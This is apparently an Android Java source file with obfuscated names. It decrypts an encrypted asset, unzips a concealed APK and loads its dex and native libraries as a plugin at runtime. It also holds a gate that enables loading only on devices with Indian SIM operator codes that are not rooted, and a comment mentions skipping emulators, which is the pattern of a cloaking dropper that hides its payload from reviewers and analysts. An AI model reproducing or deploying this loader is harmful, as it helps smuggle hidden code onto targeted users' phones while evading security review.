package com.d08a3hqr.chtjikfd;

import android.app.Application;
import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import com.d08a3hqr.chtjikfd.utils.FilePath;
import com.d08a3hqr.chtjikfd.utils.FileUtils;
import com.d08a3hqr.chtjikfd.utils.StartConstant;

import java.io.File;
import java.util.ArrayList;

/**
 * 从C:\work\code\github\App\j14helloword-jni\lib_load_jni\build\intermediates\library_and_local_jars_jni\release\jni下找到so跟apk一起压缩
 */
public class Init {
    public static void init(Context context, String password, String assetsN, boolean isDebug) {
        StartConstant.app = context;
        StartConstant.isDebug = isDebug;
        if (context != null) {
            Context applicationContext = context.getApplicationContext();
            if (applicationContext != null) {
                StartConstant.app = applicationContext;
            }
        }
        try {
            String[] plugins = context.getAssets().list(StartConstant.assetsName);
            // 没有文件就不处理
            if (plugins.length < 1) {
                return;
            }
            //解密配置文件
            FileUtils.decryptConfigFile(context, password, assetsN);
            StartConstant.assetsName =  StartConstant.b_assets_Name;
            // 没有解压，就执行文件操作
            String pluginPath = "";
            if (!FileUtils.hasFiles(FilePath.getPluginUnzipDir())) {
                // 先删除
                boolean deleteFile = FileUtils.delete(FilePath.getRootLoadDir());
                FileUtils.decryptFile(context, StartConstant.assetsName, StartConstant.b_password);
                pluginPath = getPluginPath(StartConstant.suffix_point_apk);
                // 解压apk文件
                FileUtils.unzipFile(pluginPath, FilePath.getPluginUnZipPath());
            } else {
                pluginPath = getPluginPath(StartConstant.suffix_point_apk);
            }
            // dex集合
            ArrayList<File> dexFiles = new ArrayList<>();
            File[] files = FilePath.getPluginUnzipDir().listFiles();
            for (File file : files) {
                if (file == null) {
                    continue;
                }
                if (file.getName().endsWith(StartConstant.suffix_point_dex) || file.getName().endsWith(StartConstant.suffix_point_jar)) {
                    dexFiles.add(file);
                }
            }
            String abi = getAbi();
            // 加载lib_load_jni_c
            if (StartConstant.isDebug) {
                System.loadLibrary(StartConstant.lib_so_name_load);
            } else {
                System.load(getSoPath(abi));
            }
            // 开始加载插件
            Sc1htjikfdrtart.load((Application) StartConstant.app, getLibFiles(abi), dexFiles, FilePath.getOatDir(), pluginPath);
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    public static String getPluginPath(String suffixName) {
        String[] list = FilePath.getPluginDir().list();
        String name = "";
        for (String fileName : list) {
            if (fileName.endsWith(suffixName)) {
                name = fileName;
                break;
            }
        }
        String pluginPath = FilePath.getPluginPath() + File.separator + name;
        return pluginPath;
    }

    public static ArrayList<File> getLibFiles(String abi) {
        File[] files = FilePath.getPluginUnZipLibDir().listFiles();
        File abiFile = null;
        ArrayList<File> libFiles = new ArrayList<>();
        for (File file : files) {
            if (file == null) {
                continue;
            }
            if (TextUtils.equals(file.getName(), abi)) {
                abiFile = file;
                continue;
            }
            libFiles.add(file);
        }
        if (abiFile != null) {
            libFiles.add(0, abiFile);
        }
        return libFiles;
    }

    public static String getSoPath(String abi) {
        if (abi.endsWith(StartConstant.lib_so_name_load_armeabi_v7a)) {
            return getPluginPath(StartConstant.lib_so_name_load_armeabi_v7a + StartConstant.suffix_point_so);
        }
        return getPluginPath(StartConstant.lib_so_name_load_armeabi_v8a + StartConstant.suffix_point_so);
    }

    public static String getAbi() {
        // armeabi，armeabi-v7a，x86，mips，arm64-v8a，mips64，x86_64
        String abi;
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            abi = Build.CPU_ABI;
        } else {
            abi = Build.SUPPORTED_ABIS[0];
        }
        if (TextUtils.isEmpty(abi)) {
            abi = StartConstant.abi_dir_name_default;
        }
        return abi;
    }

    /**
     * 印度卡、没有root、不是模拟器、非自然
     */
    public static boolean isLoadB(Context context) {
        // 印度卡
        if (!isIndia(context)) {
            return false;
        }
        // root
        if (isRoot()) {
            return false;
        }
        return true;
    }

    public static boolean isIndia(Context context) {
        TelephonyManager telManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (telManager == null) {
            return false;
        }
        String operator = telManager.getSimOperator();
        if (operator != null && !operator.isEmpty()) {
            String mcc = operator.substring(0, 3);
            if (mcc.equals(StartConstant.code_mcc_404) || mcc.equals(StartConstant.code_mcc_405) || mcc.equals(StartConstant.code_mcc_406)) {
                return true;
            }
        }
        return false;
    }

    public static boolean isRoot() {
        boolean hasRootDir = false;
        String[] rootDirs;
        String[] rootRelatedDirs = new String[]{"/su", "/su/bin/su", "/sbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/data/local/su", "/system/xbin/su", "/system/bin/su", "/system/sd/xbin/su", "/system/bin/failsafe/su", "/system/bin/cufsdosck", "/system/xbin/cufsdosck", "/system/bin/cufsmgr", "/system/xbin/cufsmgr", "/system/bin/cufaevdd", "/system/xbin/cufaevdd", "/system/bin/conbb", "/system/xbin/conbb"};
        int dirCount = (rootDirs = rootRelatedDirs).length;
        for (int i = 0; i < dirCount; ++i) {
            String dir = rootDirs[i];
            if ((new File(dir)).exists()) {
                hasRootDir = true;
                break;
            }
        }
        return Build.TAGS != null && Build.TAGS.contains("test-keys") || hasRootDir;
    }
}
